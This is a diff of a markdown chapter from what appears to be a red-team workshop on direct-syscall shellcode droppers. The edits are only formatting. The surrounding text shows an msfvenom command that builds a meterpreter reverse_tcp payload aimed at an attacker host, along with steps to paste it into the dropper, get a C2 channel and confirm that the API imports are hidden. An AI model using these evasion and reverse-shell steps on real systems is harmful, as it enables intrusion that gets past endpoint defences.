@@ -183,7 +183,7 @@ END  ; End of the module
      
 It is your task to **add** the ``syscalls.asm`` file **as a resource** (existing item) to the direct syscall dropper project and **complete** the **assembler code** or add the **syscall stub** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
 
-If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
+If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for **Windows 10 Enterprise 22H2** and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
     
 <details>
     <summary>Solution</summary>
@@ -262,7 +262,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
+     
+<p align="center">
 <img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 </details>    
@@ -302,7 +304,7 @@ Once the listener has been successfully started, you can run your compiled direc
 
     
 ## Dropper Analysis: Dumpbin 
-The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via ``kernel32.dll``. The following command can be used to check the imports. Which results do you expect?
 <details>    
     
 **cmd>**
@@ -326,6 +328,7 @@ dumpbin /imports Path/to/Direct_Syscall_Dropper.exe
 ## Dropper Analysis: x64dbg 
 The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
 Then we open x64dbg and attach to the running process, note that if you open the direct syscall dropper directly in x64dbg, you need to run the assembly first.
+     
 <details>
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
@@ -340,7 +343,7 @@ First we want to check which APIs (Win32 or Native) are being imported and from 
 <details>
     <summary>Solution</summary>
      
-Checking the imported symbols in our direct syscall dropper, we should again see that the Win32 APIs ``VirtualAlloc``, ``WriteProcessMemory``, ``CreateThread`` and ``WaitForSingleObject`` are no longer imported by kernel32.dll, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid. 
+Checking the imported symbols in our direct syscall dropper, we should again see that the Win32 APIs ``VirtualAlloc``, ``WriteProcessMemory``, ``CreateThread`` and ``WaitForSingleObject`` are no longer imported by ``kernel32.dll``, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid. 
      
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/df8bde2d-f471-4176-b74f-a9d9a6ed6828">
